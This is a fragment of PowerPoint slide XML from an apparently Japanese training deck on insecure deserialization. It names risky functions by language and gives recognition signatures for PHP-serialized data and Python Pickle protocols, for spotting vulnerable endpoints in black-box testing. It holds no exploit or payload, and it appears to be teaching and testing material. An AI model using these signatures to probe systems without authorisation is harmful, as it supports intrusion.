                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="359271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>readObject()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Java</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono"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59271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Deserialize()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>C# / .NET</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="359271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Marshal.load()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Ruby</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono"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8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="6238280"/>
            <a:ext cx="143946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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02 / 脆弱性の特定</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6F2"/>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63550"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>特定：ブラックボックス（シグネチャ）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="145415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058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ソースコードが無くても、シリアライズ形式には特有のパターンがある</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1870670"/>
            <a:ext cx="10566400" cy="2945011"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2587"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1870670"/>
            <a:ext cx="10566400" cy="2945011"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="2945011">
                <a:moveTo>
                  <a:pt x="10490200" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="2868811"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="0" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="2945011"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="2868811"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="76200" stAng="10800000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="2938661"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="69850" stAng="5400000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10560050" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="69850" stAng="0" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="E2E0D9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1870670"/>
            <a:ext cx="10566400" cy="2945011"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="2945011">
                <a:moveTo>
                  <a:pt x="76200" y="2945011"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="76200" y="2945011"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="10800000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="76200" stAng="0" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="12700"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="63500" stAng="16200000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="12700" y="2868811"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="63500" stAng="10800000" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="141413">
              <a:alpha val="22000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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825500" y="1883370"/>
          <a:ext cx="10547350" cy="2925961"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2320417"/>
                <a:gridCol w="8226933"/>
              </a:tblGrid>
              <a:tr h="292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>形式</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>シグネチャ例</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>PHP</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>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470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>a:4:{i:0;s:4:"Test";...}</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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41618"/>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292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Pickle proto 0（Py2既定）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>(lp0\nS'Test'\np1\na...</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Pickle proto 1 / 2 / 3</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>80 01 / 80 02 / 80 03 … で始まり . で終端</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Pickle proto 4（Py3.8+既定）</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1470"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>80 04 95 … で始まり . で終端</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1050" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="46673" marR="46673" marT="46673" marB="46673"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="292596">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
